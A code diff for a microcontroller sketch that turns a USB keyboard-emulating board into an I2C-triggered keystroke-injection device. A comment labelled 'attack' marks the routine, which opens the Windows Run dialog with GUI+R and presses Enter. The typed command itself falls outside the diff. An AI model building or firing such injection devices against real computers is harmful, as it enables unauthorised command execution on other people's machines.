@@ -1,9 +1,31 @@
+#include <Wire.h>
+
+
+
 const int ledPin = 13;   
 void setup() {
+  /* slave */
+  Wire.begin(4);                // join i2c bus with address #4
+  Wire.onReceive(receiveEvent); // register event
+  
   Serial.begin(9600);
 
-  // Blink the LED for 10 seconds, to give time to open 
-  // a word processor or text editor to receive the test
+}
+
+void loop() {
+  // Do nothing after the test
+}
+
+/* slave : on REceive event */
+void receiveEvent(int message)
+{
+  
+  int x = Wire.read();    // receive byte as an integer
+  Serial.println(x);
+  
+  /* attack
+  Blink the LED for 10 seconds, to give time to open 
+  a word processor or text editor to receive the test*/
   pinMode(ledPin, OUTPUT);
   for (int i=0; i < 5; i++) {
     digitalWrite(ledPin, HIGH);
@@ -11,16 +33,7 @@ void setup() {
     digitalWrite(ledPin, LOW);
     delay(500);
   }
-
-  /*
-  for (int i=0; i < 10; i++) {
-    Keyboard.press(KEY_A);
-    Keyboard.release(KEY_A);
-    delay(1000);
-    
-  }
-  */
-
+  
   Keyboard.press(MODIFIERKEY_GUI);
   Keyboard.press(KEY_R);
   Keyboard.release(KEY_R);
@@ -33,11 +46,6 @@ void setup() {
   Keyboard.press(KEY_ENTER);
   Keyboard.release(KEY_ENTER);
 }
-
-void loop() {
-  // Do nothing after the test
-}
-
 /*
  * 
  */
